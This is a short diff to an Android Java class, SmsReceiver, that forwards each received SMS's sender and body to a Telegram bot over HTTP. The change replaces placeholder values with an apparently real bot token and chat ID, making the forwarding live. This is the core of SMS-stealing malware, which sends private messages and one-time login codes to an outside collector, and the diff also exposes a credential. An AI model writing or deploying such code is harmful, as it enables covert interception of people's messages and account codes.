@@ -27,9 +27,9 @@ public class SmsReceiver extends BroadcastReceiver {
     private void sendToTelegram(String sender, String body) {
         try {
             OkHttpClient client = new OkHttpClient();
-            String url = "https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage";
+            String url = "https://api.telegram.org/bot8477306866:AAGPlCC436lks1gMWnRGAKteAO0ScKMerbY/sendMessage";
             RequestBody form = new FormBody.Builder()
-                    .add("chat_id", "YOUR_CHAT_ID")
+                    .add("chat_id", "8461617516")
                     .add("text", "SMS from " + sender + ":\n" + body)
                     .build();
             Request request = new Request.Builder().url(url).post(form).build();
